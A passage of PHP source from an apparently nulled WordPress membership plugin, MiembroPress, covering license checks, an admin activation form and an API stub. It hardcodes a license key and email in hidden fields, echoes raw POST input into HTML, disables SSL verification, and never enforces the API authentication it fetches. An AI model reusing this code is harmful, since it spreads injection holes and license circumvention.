				if (empty($results) || $results == "UNREGISTERED" || $results == "UNKNOWN" || $results == "CANCELLED" || $results == "FAILED" || $results == "BLOCKED") {
					$validLicense = false;
				} else {
					$validLicense = true;
				}
				if ($validLicense) {
					$version = trim($results);
				} elseif (!$licenseExpire) {
					$version = $lastversion;
				}
				$time = time();
				$hash = "";
				if ($this->salt) {
					$hash = md5($time . "|" . $version . "|" . $this->salt); $settings["lasthash"] = $hash;
					$this->debug("set last hash to $hash");
				}
				$settings["lastversion"] = $version;
				$settings["lastcheck"] = $time;
				$settings["lastversioncheck"] = $time;
				update_option($this->slug, $settings);
				$this->debug("saving settings");
				$this->call = $results;
				if (strpos($this->call, "ultimate") !== FALSE && !$this->ultimate) {
					$this->ultimate = true;
				}
				$this->debug("remote = " . $this->call);
				return $results;
			} else {
				$return = "BLOCKED";
				$this->call = $return;
				$this->debug("license = " . $return);
				$settings["lastcheck"] = $time;
				$settings["lastversioncheck"] = $time;
				$settings["lastversion"] = $version;
				update_option($this->slug, $settings);
				$this->debug("saving settings");
				return $return;
				return null;
			}
		}
		$this->debug("Did not need to call home");
		$this->call = $lastversion;
		if (strpos($this->call, "ultimate") !== FALSE && !$this->ultimate) {
			$this->ultimate = true;
		}
		return $lastversion;
	}

	function deactivate() {
		if (!isset($this->settings)) {
			$this->settings = get_option($this->slug);
		}
		unset($this->settings["email"]);
		unset($this->settings["key"]);
		unset($this->settings["lastcheck"]);
		unset($this->settings["lasthash"]);
		unset($this->settings["lastversion"]);
		update_option($this->slug, $this->settings);
	}

	function version_format($input) {
		if (is_array($input) || empty($input)) {
			return $input;
		}
		if (!strpos($input, ".") !== FALSE) {
			return $input;
		}
		list($integer, $fraction) = explode('.', $input, 2);
		$integer = intval($integer);
		$fraction = preg_replace('@'.chr(91).chr(94).'0-9'.chr(93).'@si', '', $fraction);
		return floatval($integer.".".$fraction);
	}

	function version_compare($a, $b) {
		$a = str_replace("-ultimate", "", $a);
		$b = str_replace("-ultimate", "", $b);
		$formatA = $this->version_format($a);
		$formatB = $this->version_format($b);
		$letterA = ""; $letterB = "";
		if ($formatA == $formatB) {
			preg_match('@([A-Z])'.chr(36).'@si', $a, $matches);
			$letterA = "";
			if (isset($matches[1])) { $letterA = strtoupper($matches[1]); }
			preg_match('@([A-Z])'.chr(36).'@si', $b, $matches);
			if (isset($matches[1])) { $letterB = strtoupper($matches[1]); }
			if ($letterA == "" && $letterB != "") { return -1; }
			if ($letterA != "" && $letterB == "") { return 1; }
			return strcmp($letterA, $letterB);
		} else {
			return ($formatA < $formatB) ? -1 : 1;
		}
	}

	function message($call="") {
		if (empty($call)) { $call = $this->call(); }
		$url = "tools.php?page=" . plugin_basename('miembro-press/miembro-press.php');
		if (isset($_GET["page"]) && $_GET["page"] == $url) { $url = $this->upgradeURL; }
		$parts = parse_url($url);
		if (isset($parts["host"])) {
			$hostname = $parts["host"];
		} else { $hostname = ""; }
		?>
		<?php if (empty($call)) : ?>
		<!-- do nothing -->
		<?php elseif ($call == "BLOCKED"): ?>
		<div class="error">
			<?php $ip = gethostbyname($_SERVER["HTTP_HOST"]);
			$hostname = gethostbyname("miembropress.com"); ?>
			<p><b>MiembroPress Alert:</b> Your web host is firewalled. Please contact them to allow outgoing connections from <b><?php echo $ip; ?></b> to <b><?php echo $hostname; ?></b> on port 80.<br /> We suggest you deactivate the &quot;MiembroPress&quot; plugin until this problem is solved.</p>
		</div>
		<?php elseif ($call == "UNREGISTERED"): ?>
			<!--<div class="error">
				<p><b><?php //echo $this->productName; ?> Alert:</b> <?php //echo chr("89"); ?>ou need to <a href="<?php //echo $url; ?>">enter your license key</a> to begin using the plugin.</p>
			</div>-->
		<?php elseif ($call == "CANCELLED"): ?>
			<div class="error">
				<p><b>MiembroPress Alert:</b> <?php echo chr("89"); ?>our license has been <a href="<?php echo $url; ?>">cancelled for non-payment</a>.</p>
			</div>
		<?php elseif ($call == "UNKNOWN"): ?>
			<div class="error">
				<p><b>MiembroPress Alert:</b> That email address is not found in our database, <a href="<?php echo $url; ?>">please double check your details</a>.</p>
			</div>
		<?php elseif ($call == "OVERFLOW"): ?>
			<div class="error">
				<p><b>MiembroPress Alert:</b> <?php echo chr("89"); ?>ou are using more than 5 sites with MiembroPress, please <a href="http://<?php echo $this->upgradeURL; ?>">upgrade to Ultimate</a> now.</p>
			</div>
		<?php elseif ($call == "FAILED"): ?>
			<div class="error">
				<p><b>MiembroPress Alert:</b> <a href="<?php echo $url; ?>">Incorrect license key</a> for that email address.</p>
			</div>
		<?php endif; ?>
		<?php
	}

	function register($call) {?>
		<div class="wrap" style="clear:both;">
			<form method="post" autocomplete="off">
				<table class="form-table" width="100%" cellspacing="10" cellpadding="10">
					<caption style="background: #111; border-top-left-radius: 10px; border-top-right-radius: 10px;"><img style="margin: 20px 0px 20px 0px;" src="<?php echo plugins_url( 'images/logomiembropress.png', __FILE__ ) ?>"></caption>
					<tbody>
						<th colspan="2" style="padding: 20px;background: #ffffff;border: 1px outset white;">Create your membership sites in minutes and get instant payments. With just a few clicks. Integrated with Hotmart, PayPal, ClickBank, JVZoo and WarriorPlus.</th>
					</tbody>
					<tfoot>
						<tr>
							<th colspan="2" style="padding: 20px;background: #d4d4d4;border-bottom-left-radius: 10px;border-bottom-right-radius: 10px;">Enter your license:
								<input type="text" id="licenciaMember" name="licenciaMember" value="<?php echo $_POST["licenciaMember"]?>" placeholder="Please enter your license" size="32"/>
								<input type="submit" value="Validate MiembroPress" name="Enviar" />
							</th>
						</tr>
					</tfoot>
				</table>
			</form>
		</div>
		<?php
		if(isset($_POST['Enviar'])){
			$license = $_POST['licenciaMember'];
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_URL, "https://miembros.miembropress.com/verificarClave.php?license=$license");
			$result = curl_exec($ch);
			curl_close($ch);
			$obj = json_decode($result, true);
		}

		if ($obj['success']) {
			if ($obj['type'] == 'Full') {
				?>
				<div class="wrap" style="clear:both;">
					<form method="post">
						<table class="form-table">
							<tr valign="top" style="background: #d4d4d4;">
								<td style="border-radius: 10px;">
									<h3>Please press the button to activate MiembroPress.
									<input type="submit" value="Activate MiembroPress" name="Submit" /></h3>
								</td>
							</tr>
							<td hidden style="border:none"><input type="text" id="LicenseKey" name="LicenseKey" value="<?php echo $_POST["LicenseKey"]?>" placeholder="Please enter your license" size="32" />
							<tr valign="top" hidden>
								<th scope="row" style="border:none;white-space:nowrap;">MiembroPress Key</th>
								<td style="border:none"><input onfocus="this.blur()" ondblclick="this.value=''" type="text" id="LicenseKey" name="LicenseKey" value="1416719fbb6b11370adcdab5adb9ec9a" size="32" /></td>
								<td style="border:none">(This was sent to the email you used during your purchase)</td>
							</tr>
							<tr valign="top" hidden>
								<th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
								<td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="LicenseEmail" name="LicenseEmail" value="solonetworkonline@gmail.com" size="32" /></td>
								<td style="border:none">(Please enter the email you used during your registration/purchase)</td>
							</tr>
							<tr valign="top" hidden>
								<th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
								<td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="licenciaMember" name="licenciaMember" value="<?php echo $_POST["licenciaMember"]?>" size="32" /></td>
							</tr>
							<tr valign="top" hidden>
								<td colspan="3">
									<p><b>Note:</b> <?php echo chr("89"); ?>ou need to enter the email address <B>you used to PURCHASE</B> MiembroPress, not necessarily the administrator email address of this blog.</p>
								</td>
							</tr>
						</table>
					</form>
				</div>
			   <?php $this->autofill(); ?>
			   	<?php
		   }elseif ($obj['type'] == 'Personal') {
			   if ($obj['maxsitio'] != 0) {
				   ?>
				   <div class="wrap" style="clear:both;">
					   <form method="post">
						   <table class="form-table">
						   		<tr valign="top" style="background: #d4d4d4;">
								   <td style="border-radius: 10px;">
									   <h3>Please press the button to activate MiembroPress.
									   <input type="submit" value="Activate MiembroPress" name="Submit" /></h3>
								   </td>
							   </tr>
							   <td hidden style="border:none"><input type="text" id="LicenseKey" name="LicenseKey" value="<?php echo $_POST["LicenseKey"]?>" placeholder="Please enter your license" size="32" />
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap;">MiembroPress Key</th>
								   <td style="border:none"><input onfocus="this.blur()" ondblclick="this.value=''" type="text" id="LicenseKey" name="LicenseKey" value="1416719fbb6b11370adcdab5adb9ec9a" size="32" /></td>
								   <td style="border:none">(This was sent to the email you used during your purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
								   <td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="LicenseEmail" name="LicenseEmail" value="solonetworkonline@gmail.com" size="32" /></td>
								   <td style="border:none">(Please enter the email you used during your registration/purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
   									<th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
   									<td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="licenciaMember" name="licenciaMember" value="<?php echo $_POST["licenciaMember"]?>" size="32" /></td>
   								</tr>
							   <tr valign="top" hidden>
								   <td colspan="3">
									   <p><b>Note:</b> <?php echo chr("89"); ?>ou need to enter the email address <B>you used to PURCHASE</B> MiembroPress, not necessarily the administrator email address of this blog.</p>
								   </td>
							   </tr>
						   </table>
					   </form>
				   </div>
				  <?php $this->autofill($license); ?>
				  <?php
			   }
		   }elseif ($obj['type'] == 'Profesional') {
			   if ($obj['maxsitio'] != 0) {
				   ?>
				   <div class="wrap" style="clear:both;">
					   <form method="post">
						   <table class="form-table">
						   		<tr valign="top" style="background: #d4d4d4;">
								   <td style="border-radius: 10px;">
									   <h3>Please press the button to activate MiembroPress.
									   <input type="submit" value="Activate MiembroPress" name="Submit" /></h3>
								   </td>
							   </tr>
							   <td hidden style="border:none"><input type="text" id="LicenseKey" name="LicenseKey" value="<?php echo $_POST["LicenseKey"]?>" placeholder="Please enter your license" size="32" />
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap;">MiembroPress Key</th>
								   <td style="border:none"><input onfocus="this.blur()" ondblclick="this.value=''" type="text" id="LicenseKey" name="LicenseKey" value="1416719fbb6b11370adcdab5adb9ec9a" size="32" /></td>
								   <td style="border:none">(This was sent to the email you used during your purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
								   <td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="LicenseEmail" name="LicenseEmail" value="solonetworkonline@gmail.com" size="32" /></td>
								   <td style="border:none">(Please enter the email you used during your registration/purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
   									<th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
   									<td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="licenciaMember" name="licenciaMember" value="<?php echo $_POST["licenciaMember"]?>" size="32" /></td>
   								</tr>
							   <tr valign="top" hidden>
								   <td colspan="3">
									   <p><b>Note:</b> <?php echo chr("89"); ?>ou need to enter the email address <B>you used to PURCHASE</B> MiembroPress, not necessarily the administrator email address of this blog.</p>
								   </td>
							   </tr>
						   </table>
					   </form>
				   </div>
				  <?php $this->autofill($license); ?>
				  <?php
			   }
		   }elseif ($obj['type'] == 'Agencia') {
			   if ($obj['maxsitio'] != 0) {
				   ?>
				   <div class="wrap" style="clear:both;">
					   <form method="post">
						   <table class="form-table">
						   		<tr valign="top" style="background: #d4d4d4;">
								   <td style="border-radius: 10px;">
									   <h3>Please press the button to activate MiembroPress.
									   <input type="submit" value="Activate MiembroPress" name="Submit" /></h3>
								   </td>
							   </tr>
							   <td hidden style="border:none"><input type="text" id="LicenseKey" name="LicenseKey" value="<?php echo $_POST["LicenseKey"]?>" placeholder="Please enter your license" size="32" />
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap;">MiembroPress Key</th>
								   <td style="border:none"><input onfocus="this.blur()" ondblclick="this.value=''" type="text" id="LicenseKey" name="LicenseKey" value="1416719fbb6b11370adcdab5adb9ec9a" size="32" /></td>
								   <td style="border:none">(This was sent to the email you used during your purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
								   <th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
								   <td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="LicenseEmail" name="LicenseEmail" value="solonetworkonline@gmail.com" size="32" /></td>
								   <td style="border:none">(Please enter the email you used during your registration/purchase)</td>
							   </tr>
							   <tr valign="top" hidden>
   									<th scope="row" style="border:none;white-space:nowrap">MiembroPress Email</th>
   									<td style="border:none"><input readonly ondblclick="this.value=''" type="text" id="licenciaMember" name="licenciaMember" value="<?php echo $_POST["licenciaMember"]?>" size="32" /></td>
   								</tr>
							   <tr valign="top" hidden>
								   <td colspan="3">
									   <p><b>Note:</b> <?php echo chr("89"); ?>ou need to enter the email address <B>you used to PURCHASE</B> MiembroPress, not necessarily the administrator email address of this blog.</p>
								   </td>
							   </tr>
						   </table>
					   </form>
				   </div>
				  <?php $this->autofill($license); ?>
				  <?php
			   }
		   }
		}
	}

	function autofill() {
		?>
		<iframe id="membergenius_LicenseAd" src="about:blank" width="1" height="1" style="display:none;"></iframe>
		<script type="text/javascript">
		<!--
			var membergenius_home = [
				"http://www.incomemachine.com/members/?wpdrip_headless=1"
			];
			function membergenius_sendMessage() {
				document.getElementById("membergenius_LicenseAd").contentWindow.postMessage("license", "*");
			}
			function membergenius_receiveMessage(event) {
				if (event == undefined || !event || event.data == undefined) { return; }
				else if (event.data == "" || event.data == null || event.data == "null") {
					membergenius_home = membergenius_home.slice(1);
					membergenius_autofill(membergenius_home[0]);
					return;
				}
				else if (event.data != undefined && event.data != null && event.data != "") {
					var pieces = event.data.split("|");

					var key = unescape(pieces[0]);
					var email = unescape(pieces[1]);

					if (key == undefined || key == "" || email == undefined || email == "" || key == null || email == null) { return; }
					if (key == "undefined" || email == "undefined" || key == "null" || email == "null") { return; }

					if (document.getElementById("LicenseKey") && document.getElementById("LicenseKey").value == "") {
						document.getElementById("LicenseKey").value = key;
						document.getElementById("LicenseEmail").value = email;
					}
				}
			}

			function membergenius_autofill(url) {
				try {
					window.addEventListener("message", membergenius_receiveMessage, false);
					document.getElementById("membergenius_LicenseAd").onload = membergenius_sendMessage;
					document.getElementById("membergenius_LicenseAd").src = url;
				}
				catch(err) {
				}
			}

			jQuery(function() {
				membergenius_autofill(membergenius_home[0]);
			});

			<?php echo '/' . '/' . ' -->'; ?>
		</script>
		</div>
		<?php
	}

	function key($email) {
		$options = get_option($this->slug);
		$master = $options["master"];
		return md5($email . "|" . $master);
	}

	function debug($text="", $lineBreak=true) {
		if (!$this->debug) { return; }
		if (!current_user_can("update_plugins")) { return; }
		$this->msg($text, $lineBreak);
	}

	function msg($text="", $lineBreak=true, $step=false) {
		$elapsed = time() - $this->start;
		if ($step) {
			$this->step++; echo '<span title="' . $elapsed . '">';
			echo '<b>Step ' . $this->step . ':</b>';
			echo '</span> ';
		}

		if (is_array($text)) {
			echo '<xmp>'.var_export($text, true).'</xmp>';
		} else { echo $text; }

		if ($lineBreak) { echo "<br />"; }
		if ($this->debug) { error_log($text); }
		while (ob_get_level() > 0) { ob_end_flush(); }
		flush();
	}

	function buffer() {
		for ($i=0;$i<5000;$i++) {
			echo '<!-- buffer -->' . "";
		}
		flush();
	}
}

/*
if ( !class_exists('PluginUpdateChecker') ): class PluginUpdateChecker {
	public $metadataUrl = '';
	public $pluginFile = '';
	public $slug = '';
	public $checkPeriod = 12;
	public $optionName = '';
	function __construct($metadataUrl, $pluginFile, $slug = '', $checkPeriod = 12, $optionName = ''){
		$this->metadataUrl = $metadataUrl;
		$this->pluginFile = plugin_basename($pluginFile);
		$this->checkPeriod = $checkPeriod;
		$this->slug = $slug;
		$this->optionName = $optionName;
		if ( empty($this->slug) ){
			$this->slug = basename($this->pluginFile, '.php');
		}
		if ( empty($this->optionName) ){
			$this->optionName = 'external_updates-' . $this->slug;
		}
		$this->installHooks();
	}

	function installHooks(){
		add_filter('plugins_api', array(&$this, 'injectInfo'), 10, 3);
		add_filter('site_transient_update_plugins', array(&$this,'injectUpdate'));
		add_filter('transient_update_plugins', array(&$this,'injectUpdate'));
		$cronHook = 'check_plugin_updates-' . $this->slug;
		if ( $this->checkPeriod > 0 ){ add_filter('cron_schedules', array(&$this, '_addCustomSchedule'));
			if ( !wp_next_scheduled($cronHook) && !defined('WP_INSTALLING') ) {
				$scheduleName = 'every' . $this->checkPeriod . 'hours';
				wp_schedule_event(time(), $scheduleName, $cronHook);
			}
			add_action($cronHook, array(&$this, 'checkForUpdates'));
			add_action( 'admin_init', array(&$this, 'maybeCheckForUpdates') );
		} else {
			wp_clear_scheduled_hook($cronHook);
		}
	}

	function _addCustomSchedule($schedules){
		if ( $this->checkPeriod && ($this->checkPeriod > 0) ){
			$scheduleName = 'every' . $this->checkPeriod . 'hours';
			$schedules[$scheduleName] = array( 'interval' => $this->checkPeriod * 3600, 'display' => sprintf('Every %d hours', $this->checkPeriod), );
		}
		return $schedules;
	}

	function requestInfo($queryArgs = array()){
		$queryArgs['installed_version'] = $this->getInstalledVersion();
		$queryArgs = apply_filters('puc_request_info_query_args-'.$this->slug, $queryArgs);
		$options = array( 'timeout' => 30, 'headers' => array( 'Accept' => 'application/json' ), );
		$options = apply_filters('puc_request_info_options-'.$this->slug, array());
		$url = $this->metadataUrl;
		if ( !empty($queryArgs) ){
			$url = add_query_arg($queryArgs, $url);
		}
		$result = wp_remote_get( $url, $options );
		$pluginInfo = null;
		if ( !is_wp_error($result) && isset($result['response']['code']) && ($result['response']['code'] == 200) && !empty($result['body']) ){
			$pluginInfo = PluginInfo::fromJson($result['body']);
		}
		$pluginInfo = apply_filters('puc_request_info_result-'.$this->slug, $pluginInfo, $result);
		return $pluginInfo;
	}

	function requestUpdate(){
		$pluginInfo = $this->requestInfo(array('checking_for_updates' => '1'));
		if ( $pluginInfo == null ){ return null; }
		return PluginUpdate::fromPluginInfo($pluginInfo);
	}

	function getInstalledVersion(){
		if ( !function_exists('get_plugins') ){
			require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
		}
		$allPlugins = get_plugins();
		if ( array_key_exists($this->pluginFile, $allPlugins) && array_key_exists('Version', $allPlugins[$this->pluginFile]) ){
			return $allPlugins[$this->pluginFile]['Version'];
		} else { return ''; };
	}

	function checkForUpdates(){
		$state = get_option($this->optionName);
		if ( empty($state) ){
			$state = new StdClass;
			$state->lastCheck = 0;
			$state->checkedVersion = '';
			$state->update = null;
		}
		$state->lastCheck = time();
		$state->checkedVersion = $this->getInstalledVersion();
		update_option($this->optionName, $state);
		$state->update = $this->requestUpdate();
		update_option($this->optionName, $state);
	}

	function maybeCheckForUpdates(){
		if ( empty($this->checkPeriod) ){ return; }
		$state = get_option($this->optionName);
		if (strpos($_SERVER["PHP_SELF"], 'update-core.php') !== FALSE) {
			$state->lastCheck = 0;
		}
		$shouldCheck = empty($state) || !isset($state->lastCheck) || ( (time() - $state->lastCheck) >= $this->checkPeriod*3600 );
		if ( $shouldCheck ){ $this->checkForUpdates(); }
	}

	function injectInfo($result, $action = null, $args = null){
		$relevant = ($action == 'plugin_information') && isset($args->slug) && ($args->slug == $this->slug);
		if ( !$relevant ){ return $result; }
		$pluginInfo = $this->requestInfo();
		if ($pluginInfo){ return $pluginInfo->toWpFormat(); }
		return $result;
	}

	function injectUpdate($updates){
		$state = get_option($this->optionName);
		if ( !empty($state) && isset($state->update) && !empty($state->update) ){
			if ( version_compare($state->update->version, $this->getInstalledVersion(), '>') ){
				$wp_format = $state->update->toWpFormat();
				$wp_format->plugin = $this->pluginFile;
				$updates->response[$this->pluginFile] = $wp_format;
			}
		}
		return $updates;
	}

	function addQueryArgFilter($callback){
		add_filter('puc_request_info_query_args-'.$this->slug, $callback);
	}

	function addHttpRequestArgFilter($callback){
		add_filter('puc_request_info_options-'.$this->slug, $callback);
	}

	function addResultFilter($callback){
		add_filter('puc_request_info_result-'.$this->slug, $callback, 10, 2);
	}
} endif;
*/

if ( !class_exists('PluginInfo') ): class PluginInfo {
	public $name;
	public $slug;
	public $version;
	public $homepage;
	public $sections;
	public $download_url;
	public $author;
	public $author_homepage;
	public $requires;
	public $tested;
	public $upgrade_notice;
	public $rating;
	public $num_ratings;
	public $downloaded;
	public $last_updated;
	public $id = 0;

	public static function fromJson($json){
		$apiResponse = json_decode($json);
		if ( empty($apiResponse) || !is_object($apiResponse) ){ return null; }
		$valid = isset($apiResponse->name) && !empty($apiResponse->name) && isset($apiResponse->version) && !empty($apiResponse->version);
		if ( !$valid ){ return null; }
		$info = new PluginInfo();
		foreach(get_object_vars($apiResponse) as $key => $value){ $info->$key = $value; }
		return $info;
	}

	public function toWpFormat(){
		$info = new StdClass;
		$sameFormat = array( 'name', 'slug', 'version', 'requires', 'tested', 'rating', 'upgrade_notice', 'num_ratings', 'downloaded', 'homepage', 'last_updated', 'plugin' );
		foreach($sameFormat as $field){
			if ( isset($this->$field) ) {
				$info->$field = $this->$field;
			}
		}

		$info->download_link = $this->download_url;
		if ( !empty($this->author_homepage) ){
			$info->author = sprintf('<a href="%s">%s</a>', $this->author_homepage, $this->author);
		} else {
			$info->author = $this->author;
		}

		if ( is_object($this->sections) ){
			$info->sections = get_object_vars($this->sections);
		} elseif ( is_array($this->sections) ) {
			$info->sections = $this->sections;
		} else {
			$info->sections = array('description' => '');
		}
		return $info;
	}
} endif;

if ( !class_exists('PluginUpdate') ): class PluginUpdate {
	public $id = 0;
	public $slug;
	public $version;
	public $homepage;
	public $download_url;
	public $upgrade_notice;
	public static function fromJson($json){
		$pluginInfo = PluginInfo::fromJson($json);
		if ( $pluginInfo != null ) {
			return PluginUpdate::fromPluginInfo($pluginInfo);
		} else { return null; }
	}

	public static function fromPluginInfo($info){
		$update = new PluginUpdate();
		$copyFields = array('id', 'slug', 'version', 'homepage', 'download_url', 'upgrade_notice');
		foreach($copyFields as $field){ $update->$field = $info->$field; }
		return $update;
	}

	public function toWpFormat(){
		$update = new StdClass;
		$update->id = $this->id;
		$update->slug = $this->slug;
		$update->new_version = $this->version;
		$update->url = $this->homepage;
		$update->package = $this->download_url;
		if ( !empty($this->upgrade_notice) ){
			$update->upgrade_notice = $this->upgrade_notice;
		}
		return $update;
	}
} endif;

$membergenius = new MemberGenius();

class MGAPI {
	public static function GetOption($option) {
		if ($option == "non_members_error_page") {
			return home_url("wp-login.php");
		}
	}

	public static function GetLevels() {
		global $membergenius;
		return array_map(array("MGAPI", "GetLevelsMap"), $membergenius->model->getLevels());
	}

	public static function GetLevelsMap($level) {
		$slug = strtolower(preg_replace('@[^A-Z0-9]+@si', '-', $level->level_name));
		return array( 'name' => $level->level_name, 'url' => $level->level_hash, 'loginredirect' => '---', 'afterregredirect' => '---', 'noexpire' => ($level->level_expiration > 0) ? 0 : 1, 'upgradeTo' => '0', 'upgradeAfter' => '0', 'upgradeMethod' => '0', 'count' => $level->active, 'role' => 'subscriber', 'levelOrder' => '', 'slug' => $slug, 'ID' => $level->ID );
	}

	public static function GetContentByLevel($contentType="all", $level) {
		global $membergenius;
		$content = $membergenius->model->getPostAccess($level);
		if ($contentType == "posts") {
			$content = get_posts(array("posts_per_page"=>-1, "post_type" => "post", "include" => $content));
			$content = array_map(create_function('$p', 'return $p->ID;'), $content);
		} elseif ($contentType == "pages") {
			$content = get_pages(array("posts_per_page"=>-1, "post_type" => "page", "include" => $content));
			$content = array_map(create_function('$p', 'return $p->ID;'), $content);
		}
		return $content;
	}

	public static function AddUser($username, $email, $password, $firstname="", $lastname="") { }
	public static function EditUser($id, $email="", $password="", $firstname="", $lastname="", $displayname="", $nickname="") { }
	public static function DeleteUser($id, $reassign=null) { }
	public static function GetUserLevels($user, $levels="all", $return="names", $addpending=false, $addsequential=false, $cancelled=0 ) {
		global $membergenius;
		if ($cancelled == 1) {
			$info = $membergenius->model->getLevelInfo($user, "*");
		} else {
			$info = $membergenius->model->getLevelInfo($user, "A");
		}

		if ($return == "skus") {
			$info = array_map(create_function('$l', 'return $l->level_id;'), $info);
		} else {
			$info = array_map(create_function('$l', 'return $l->level_name;'), $info);
		}

		if ($levels != "all") {
			$theLevels = @explode(",", $levels);
			if (count($theLevels) == 0) {
				$theLevels = array($levels);
			}
			foreach ($info as $key => $level) {
				if (!in_array($key, $theLevels)) {
					unset($info[$key]);
				}
			}
		}
		return $info;
	}

	public static function UserLinks($userID) {
		$info = MGAPI::GetUserLevels();
		var_export($info);
	}

	public static function AddUserLevels($user, $levels, $txid="", $autoresponder=false) {
		global $membergenius;
		$user = @intval($user);
		if (!get_user_by("id", $user)) { return false; }
		foreach ($levels as $level) {
			$add = $membergenius->model->add($user, $level, $txid);
			if ($autoresponder) {
				$membegenius->model->subscribe($user, $level);
			}
		}
		return true;
	}

	public static function DeleteUserLevels($user, $levels, $autoresponder=true) { }
	public static function GetMembers() { }
	public static function MergedMembers($levels, $strippending) { }
	public static function GetMemberCount($level) { }
	public static function MakePending($id) { }
	public static function MakeActive($id) { }
	public static function MakeSequential($id) { }
	public static function MakeNonSequential($id) { }
	public static function MoveLevel($id, $lev) { }
	public static function CancelLevel($id, $lev) { }
	public static function UnCancelLevel($id, $lev) { }
	public static function GetPostLevels($id) {
		return MGAPI::GetPageLevels($id);
	}

	public static function AddPostLevels($id, $levels){
		return MGAPI::AddPageLevels($id, $levels);
	}

	public static function DeletePostLevels($id, $levels) { }
	public static function GetPageLevels($id) {
		global $membergenius; return $membergenius->model->getLevelsFromPost($id);
	}

	public static function AddPageLevels($id, $levels) {
		global $membergenius; $thePage = get_posts(array("include" => array($id), "post_type" => array("page", "post")));
		if (!$thePage) { return false; }
		foreach ($levels as $level) { $membergenius->model->protect($id, $level); }
		return true;
	}

	public static function DeletePageLevels($id, $levels) { }
	public static function GetCategoryLevels($id) { }
	public static function AddCategoryLevels($id, $levels) { }
	public static function DeleteCategoryLevels($id, $levels) { }
	public static function GetCommentLevels($id) { }
	public static function AddCommentLevels($id, $levels) { }
	public static function DeleteCommentLevels($id, $levels) { }
	public static function PrivateTags($content) { }
	public static function ShowWLMWidget($widgetargs) { }
	public static function SetProtect($id, $yesNo="") {
		global $membergenius;
		if ($yesNo == "") { $yesNo = chr(89); }
		$thePage = get_posts(array("include" => array($id), "post_type" => array("page", "post")));
		if (!$thePage) { return false; }
		if ($yesNo == chr(89)) {
			$membergenius->model->protect($id, -1);
		} else {
			$membergenius->model->unprotect($id, -1);
		}
	}

	public static function IsProtected($postID) {
		global $membergenius; return $membergenius->model->isProtected($postID);
	}
}

class MGAPI2 {
	const marker = '/wlmapi/2.0/';
	const marker_alternate = '/wlmapi/2_0/';
	private $return_type = 'php';
	private $request = '';
	var $method; var $data;
	const ERROR_ACCESS_DENIED = 0x00010000;
	const ERROR_INVALID_AUTH = 0x00010001;
	const ERROR_INVALID_REQUEST = 0x00010002;
	const ERROR_INVALID_RETURN_FORMAT = 0x00010004;
	const ERROR_INVALID_RESOURCE = 0x00010008;
	const ERROR_FORMAT_NOT_SUPPORTED_JSON = 0x00020001;
	const ERROR_FORMAT_NOT_SUPPORTED_XML = 0x00020002;
	const ERROR_METHOD_NOT_SUPPORTED = 0x00040001;
	function __construct($request='EXTERNAL', $method='GET', $data=null) {
		$this->method = $method;
		if ($request == 'EXTERNAL') {
			$request = $_SERVER['REQUEST_URI'];
			$method = $_SERVER['REQUEST_METHOD'];
			if ($method == 'GET') { $data = $_GET; }
			elseif ($method == 'POST') { $data = $_POST; }
			else { parse_str(file_get_contents('php://input'), $data); }
			$this->method = $method;
			$this->data = $data;
		} else { return; }

		if (strpos($request, MGAPI2::marker) !== false) {
			$explode = explode(MGAPI2::marker, $request, 2);
			$pop = array_pop($explode);
			$request = explode('/', $pop);
		} elseif (strpos($request, MGAPI2::marker_alternate) !== false) {
			$explode = explode(MGAPI2::marker_alternate, $request, 2);
			$pop = array_pop($explode); $request = explode('/', $pop);
		}

		$this->return_type = strtoupper(array_shift($request));
		$accepted_return_types = array('PHP');
		if (!in_array($return_type, $accepted_return_types)) {
			MGAPI2::process_result($this->error(MGAPI2::ERROR_INVALID_RETURN_FORMAT));
		}

		$this->request = implode( '/', $request );
		$functions = array();
		$parameters = array();
		while (!empty($request)) {
			$functions[] = trim(strtolower(array_shift($request)));
			if (!empty($request)) {
				$parameters[] = trim(array_shift($request));
			}
		}
		$functions = array_diff($functions, array(''));
		$function = '_' . implode('_', $functions);
		$result = $this->parse($function, $parameters);
		$this->output($result);
	}
	function output($result) {
		if ($this->return_type != 'PHP') { die(); }
		header('Content-type: text/plain');
		$output = serialize($this->process_result($result));
		echo $output;
		die();
	}

	function parse($function, $parameters) {
		if (!method_exists($this, $function)) {
			$this->output($this->error(MGAPI2::ERROR_INVALID_REQUEST));
			return;
		}
		if ($function == '_resources' || $function == '_auth') {
			$result = call_user_func(array($this, $function));
		} else {
			$key = $this->auth_key();
			$cookie = $this->auth_cookie();
			$result = call_user_func_array(array($this, $function), $parameters);
		}
		$this->output($result);
	}

	function error($error) {
		return array('ERROR_CODE' => $error, 'ERROR' => MGAPI2::get_error_msg($error));
	}

	private function get_error_msg($error) {
		if ($error == MGAPI2::ERROR_METHOD_NOT_SUPPORTED) { return 'Method Not Supported';}
		if ($error == MGAPI2::ERROR_ACCESS_DENIED) { return 'Access Denied, not authenticated'; }
		if ($error == MGAPI2::ERROR_INVALID_AUTH) { return 'Access denied, invalid authentication'; }
		if ($error == MGAPI2::ERROR_INVALID_REQUEST) { return 'Page not found, invalid method'; }
